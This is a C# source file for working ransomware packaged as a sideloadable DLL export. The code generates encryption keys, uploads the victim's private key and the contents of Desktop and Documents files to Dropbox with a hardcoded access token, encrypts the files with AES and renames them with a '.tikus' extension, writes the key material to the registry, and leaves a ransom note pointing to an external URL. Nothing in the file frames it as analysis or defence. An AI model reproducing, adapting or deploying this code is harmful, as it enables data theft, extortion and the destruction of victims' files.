using Dropbox.Api;
using Dropbox.Api.Files;
using RGiesecke.DllExport;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.OpenSsl;
using Org.BouncyCastle.Security;
using System.Security.Principal;
using Microsoft.Win32;
using PgpCore;

namespace Program
{
    public class Asymmetric
    {
        public class RSA
        {
            /// <summary>
            /// Create a public and private key.
            ///
            /// The RSACryptoServiceProvider supports key sizes from 384
            /// bits to 16384 bits in increments of 8 bits if you have the
            /// Microsoft Enhanced Cryptographic Provider installed. It
            /// supports key sizes from 384 bits to 512 bits in increments
            /// of 8 bits if you have the Microsoft Base Cryptographic
            /// Provider installed.
            /// </summary>
            /// <param name="publicKey">The created public key.</param>
            /// <param name="privateKey">The created private key.</param>
            /// <param name="keySize">Size of keys.</param>
            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 2048)
            {
                publicKey = null;
                privateKey = null;

                var csp = new CspParameters
                {
                    ProviderType = 1,
                    Flags = CspProviderFlags.UseArchivableKey,
                    KeyNumber = (int)KeyNumber.Exchange
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(keySize, csp);

                publicKey = rsa.ToXmlString(false);
                privateKey = rsa.ToXmlString(true);

                rsa.PersistKeyInCsp = false;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="bytes">Bytes to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static byte[] Encrypt(byte[] bytes, string publicKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(publicKey);
                var data = rsa.Encrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="input">Data to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static string Encrypt(string input, string publicKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Convert.ToBase64String(
                    Encrypt(
                        Encoding.UTF8.GetBytes(input),
                        publicKey));
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="bytes">Bytes to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static byte[] Decrypt(byte[] bytes, string privateKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(privateKey);
                var data = rsa.Decrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="input">Base64 data to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static string Decrypt(string input, string privateKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Encoding.UTF8.GetString(
                    Decrypt(
                        Convert.FromBase64String(input),
                        privateKey));
            }
        }
    }

    public class GetKey
    {
        public static string GetPublicKey()
        {
            var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
            return publicKey;
        }

    }

    public class AES
    {

        public static byte[] AESEncrypt(byte[] clearData, byte[] aes_key, byte[] aes_iv)
        {
            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = aes_key;
            alg.IV = aes_iv;

            CryptoStream cs = new CryptoStream(ms,
               alg.CreateEncryptor(), CryptoStreamMode.Write);

            // Write the data and make it do the encryption 
            cs.Write(clearData, 0, clearData.Length);

            cs.Close();

            byte[] encryptedData = ms.ToArray();

            return encryptedData;
        }
    }

    public class Dropbox
    {
        public static string token = "PnVBRiPB-vQAAAAAAAAAAXQgy33NH-zcV0O_NaoOe_8ZZhb985g6yJ5vHmHAf450";

        public static DropboxClient dbx = new DropboxClient(token);

        public static async Task UploadFile(DropboxClient dbx, string fileToUpload, string folderName)
        {
            //upload file
            //var fileToUpload = $"{baseDir}\\encme.txt.ch4rm";
            var folder = $"/{folderName}";
            var fileName = Path.GetFileName(fileToUpload);
            using (MemoryStream mem = new MemoryStream(File.ReadAllBytes(fileToUpload)))
            {
                var updated = await dbx.Files.UploadAsync(
                folder + "/" + fileName,
                WriteMode.Overwrite.Instance,
                body: mem);
            }
        }

        public static async Task UploadFile(DropboxClient dbx, byte[] fileToUpload, string folderName, string fileName)
        {
            //upload file
            //var fileToUpload = $"{baseDir}\\encme.txt.ch4rm";
            var folder = $"/{folderName}";
            using (MemoryStream mem = new MemoryStream(fileToUpload))
            {
                var updated = await dbx.Files.UploadAsync(
                folder + "/" + fileName,
                WriteMode.Overwrite.Instance,
                body: mem);
            }
        }

        public static async Task<byte[]> DownloadFile(DropboxClient dbx)
        {
            string folder = "";
            string file = "";

            using (var response = await dbx.Files.DownloadAsync(folder + "/" + file))
            {
                var s = response.GetContentAsByteArrayAsync();
                s.Wait();
                var d = s.Result;
                return d;
            }
        }

        public static async Task Run()
        {
            using (DropboxClient dbx = new DropboxClient(token))
            {
                //display information
                var full = await dbx.Users.GetCurrentAccountAsync();
                Console.WriteLine("{0} - {1}", full.Name.DisplayName, full.Email);

                //listing files and directories
                var list = await dbx.Files.ListFolderAsync(string.Empty);
                foreach (var item in list.Entries)
                {
                    Console.WriteLine($"D {item.Name}");
                }

            }
        }
    }

    public class Random
    {
        private static System.Random random = new System.Random();

        public static string GenerateRandomString()
        {
            int length = random.Next(8, 15);
            var rString = "";
            for (var i = 0; i < length; i++)
            {
                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
            }
            return rString;
        }

        public static byte[] GetRandomIV()
        {
            byte[] iv = new byte[16];

            for (int i = 0; i < 16; i++)
            {
                random.NextBytes(iv);
            }
            return iv;
        }

        public static byte[] GetRandomKey()
        {
            byte[] key = new byte[32];

            for (int i = 0; i < 32; i++)
            {
                random.NextBytes(key);
            }
            return key;
        }
    }

    
    public class Program
    {
        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }

        public static string GenKeyPairs()
        {
            Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);

            UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key", uid);
            
            //File.WriteAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"), publicKey);
            //File.WriteAllText(Path.Combine( @"C:\Users\ch4rm\Desktop\encme", "private.key"), privateKey);
            return publicKey;
        }

        public static void UploadKeys(byte[] key, string fileName, string uid)
        {
            var remotePath = $"{uid}/agent_tikus_storage";

            var upload = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, key, remotePath, fileName));
            upload.Wait();
        }

        //https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static void LeaveRansomNote(string ransomNotePath, string encCPrivKey)
        {
            string ransomNote = $@"
All your files have been encrypted. I don't ask for money. All I want is a cheese...

     ___ _____
    /\ (_)    \
    /  \      (_,
    _)  _\   _    \
/   (_)\_( )____\
\_     /    _  _/
    ) /\/  _ (o)(
    \ \_) (o)   /
    \/________/ 

Send me this to get your file back : http://charmys.hopto.org:35478/

{encCPrivKey}
            
Have a nice day :)
            ";
            File.WriteAllText(ransomNotePath, ransomNote);
        }

        public static void StartProcess(string program)
        {
            System.Diagnostics.Process.Start(program, "http://www.google.com");
        }

        private static string GetXmlRsaKey(string pem, Func<object, RSA> getRsa, Func<RSA, string> getKey)
        {
            using (var ms = new MemoryStream())
            using (var sw = new StreamWriter(ms))
            using (var sr = new StreamReader(ms))
            {
                sw.Write(pem);
                sw.Flush();
                ms.Position = 0;
                var pr = new PemReader(sr);
                object keyPair = pr.ReadObject();
                using (RSA rsa = getRsa(keyPair))
                {
                    var xml = getKey(rsa);
                    return xml;
                }
            }
        }

        public static string PemToXml(string pem)
        {
            if (pem.StartsWith("-----BEGIN RSA PRIVATE KEY-----")
                || pem.StartsWith("-----BEGIN PRIVATE KEY-----"))
            {
                return GetXmlRsaKey(pem, obj =>
                {
                    if ((obj as RsaPrivateCrtKeyParameters) != null)
                        return DotNetUtilities.ToRSA((RsaPrivateCrtKeyParameters)obj);
                    var keyPair = (AsymmetricCipherKeyPair)obj;
                    return DotNetUtilities.ToRSA((RsaPrivateCrtKeyParameters)keyPair.Private);
                }, rsa => rsa.ToXmlString(true));
            }

            if (pem.StartsWith("-----BEGIN PUBLIC KEY-----"))
            {
                return GetXmlRsaKey(pem, obj =>
                {
                    var publicKey = (RsaKeyParameters)obj;
                    return DotNetUtilities.ToRSA(publicKey);
                }, rsa => rsa.ToXmlString(false));
            }

            throw new InvalidKeyException("Unsupported PEM format...");
        }

        public static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static readonly string SPubKey = @"-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBGDtQ88BCACC8Iovid/NU8011YiPyqIwQlwNMGzOyz7szDt6J0hdjNFhG/wl
QOs4/mgYGpU+tMi4ZQ+uu9YfWxt1YUQN0/d/UgqFkr/QuJHQimKfEPL7/Yqiegm4
0f7x0pNsup5BYm66e5po448nRCvjkJ6SO0IDHp8rANwvsuThItykuQ8ipmCfay0F
/8aMRKijbVbYAK61bCT6B/Vo0uYW1/EL0rk6qeZG7bnDPKKC8UaKf+I+/8fn2Eqw
Em5f59jRwXBaPziSegZ4WJ+chfCmnHXI2nbSFUgAUtizeek4Ln701oPr2yzR+wys
7xiFSdeTEn41dTrszdxRzBHkGZuCMygfEBU9ABEBAAG0FGFnZW50dGlrdXNAZ21h
aWwuY29tiQEcBBABAgAGBQJg7UPPAAoJEFg6uKipIcesIogH/0FLRzFLkJghHF59
3x4PDq4Mv2Jv2CejvAcz7QblX8Y/+hh3RMLFVQzfd2yAqP6IXX0SAfbwM+YwqFUG
ttKYJRJWNF/atnnDdRvOuqn2lF5M87D4XcEA5R/g2+j1ivAyZJJZj/p4ynJsSzvD
H6+JYjroALHGQecTNDbZi12gatNQzLzAu5+sSKl79nz/2HNW+x/5Zk2ThoabkgKx
mDm0wqMA80jEX9OrSfAp1GNCafg7+CYPXpWqFORbcnWqzUYoAbxt9dZKROkbDMZj
kVPdbfA5VrgZ6TWsQz8eL3kNNywPhal9DeWd51hnHps5F3j1wNH/fRf4lWMitGv4
sKB2dDA=
=HpfV
-----END PGP PUBLIC KEY BLOCK-----
";

        //https://stackoverflow.com/questions/19570611/how-to-ignore-an-exception-and-continue-processing-a-foreach-loop
        public static readonly string userName = Environment.UserName;
        public static readonly string uid = $"{Environment.MachineName}-{Environment.UserName}";

        private static Dictionary<DirectoryInfo, List<string>> validDirs = new Dictionary<DirectoryInfo, List<string>>();
        private static List<string> logger = new List<string>();

        private static List<string> uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32", "AppData", "Windows" };
        private static List<string> whitelistExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll", "pdb", "ini" };
        private static string baseDir = $@"C:\Users\{userName}\Desktop\aniqfakhrul";

        static void RecursiveSearch(string root)
        {
            string[] files = null;
            string[] subDirs = null;

            // First, process all the files directly under this folder 
            try
            {
                files = Directory.EnumerateFiles(root).Where(i => !whitelistExtensions.Any(x => i.Contains(x))).ToArray();
            }
            catch (UnauthorizedAccessException e)
            {
                logger.Add(e.Message);
            }
            catch (System.IO.DirectoryNotFoundException e)
            {
                Console.WriteLine(e.Message);
            }

            if (files != null)
            {

                validDirs.Add(new DirectoryInfo(root), files.ToList());
                subDirs = Directory.GetDirectories(root);

                foreach (string dir in subDirs)
                {
                      RecursiveSearch(dir);
                }
            }
        }



        //method to check
        static bool isExcluded(List<string> exludedDirList, string target)
        {
            return exludedDirList.Any(d => new DirectoryInfo(target).Name.Contains(d));
        }

        // this export call can be used sideloaded with \windows\system32\dism.exe, dismcore.dll
        [DllExport]
        public static void DllGetClassObject()
        {
            //start firefox
            //StartProcess("firefox.exe");

            var ransomFormat = ".tikus";

            var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var folderToExtract = new List<string> { userDesktopPath, "Documents" };

            //var SPubKey = PemToXml("-----BEGIN PUBLIC KEY-----\r\n" + SPubKeyOneLine + "\r\n-----END PUBLIC KEY-----");

            if (Directory.Exists(baseDir))
            {
                //generate key pairs
                //var publicKey = GenKeyPairs();
                Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);

                //now encrypt client's private key
                var encCPrivKey = string.Empty;
                MemoryStream inputFileStream = new MemoryStream(Encoding.UTF8.GetBytes(privateKey));
                MemoryStream publicKeyStream = new MemoryStream(Encoding.UTF8.GetBytes(SPubKey));
                var tempFile = $@"C:\Windows\Tasks\{Random.GenerateRandomString()}.pgp";
                using (PGP pgp = new PGP())
                {
                    using (Stream outputFileStream = File.Create(tempFile))
                    {
                        pgp.EncryptStream(inputFileStream, outputFileStream, publicKeyStream, true, true);
                        outputFileStream.Close();
                        encCPrivKey = File.ReadAllText(tempFile);
                        File.Delete(tempFile);
                    }
                }

                //var encPrivKey = Asymmetric.RSA.Encrypt(privateKey, SPubKey);
                //var b64encPrivKey = Convert.ToBase64String(Encoding.UTF8.GetBytes(encPrivKey));
                //Console.WriteLine(b64encPrivKey);
                UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key", uid);

                byte[] aes_key = Random.GetRandomKey();
                byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);

                byte[] aes_iv = Random.GetRandomIV();
                byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);

                //var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories).Where(d => !isExcluded(uselessFilesAndFolders, d));

                byte[] encrypted;

                //write aes_key and aes_iv
                //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
                //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);

                if (IsElevated)
                {
                    //insert into reg key
                    RegistryKey LocalReg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\FreePalestine");
                    LocalReg.SetValue("aesKey", encAesKey);
                    LocalReg.SetValue("aesIV", encIVKey);
                    LocalReg.SetValue("encCPubKey", publicKey);
                    LocalReg.SetValue("encCPrivKey", encCPrivKey);
                    LocalReg.SetValue("encSPubKey", SPubKey);

                }

                //write symmetic key
                UploadKeys(encAesKey, "aes.key", uid);
                //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
                UploadKeys(encIVKey, "aes.iv", uid);
                //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);

                RecursiveSearch(baseDir);

                foreach (var listFiles in validDirs.Values)
                {
                    foreach(var file in listFiles)
                    {
                        var newFileExtension = $"{file}{ransomFormat}";
                        var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";

                        if (!file.EndsWith(ransomFormat))
                        {
                            if(!uselessFilesAndFolders.Any(x => file.Contains(x)))
                            {
                                try
                                {
                                    //Console.WriteLine($"Full {file}");
                                    var outFolder = Path.Combine(uid, Path.GetDirectoryName(file).Replace(baseDir, "").Trim('\\'));
                                    outFolder = outFolder.Replace("\\", "/");
                                    //Console.WriteLine($"ALtered: {outFolder}");
                                    var fileContent = File.ReadAllBytes(file);

                                    if (folderToExtract.Any(i => file.Contains(i)))
                                    {
                                        //upload file to google drive (do in background)
                                        var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
                                        task.Wait();
                                    }

                                    //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
                                    encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);

                                    File.WriteAllBytes(file, encrypted);

                                    File.Move(file, newFileExtension);

                                    if (!File.Exists(ransomNotePath))
                                        LeaveRansomNote(ransomNotePath, encCPrivKey);

                                }
                                catch
                                {

                                }
                            }

                        }
                    }
                    

                    

                }
            }
            else
            {
                Console.WriteLine("Not found");
            }


        }
    }
}
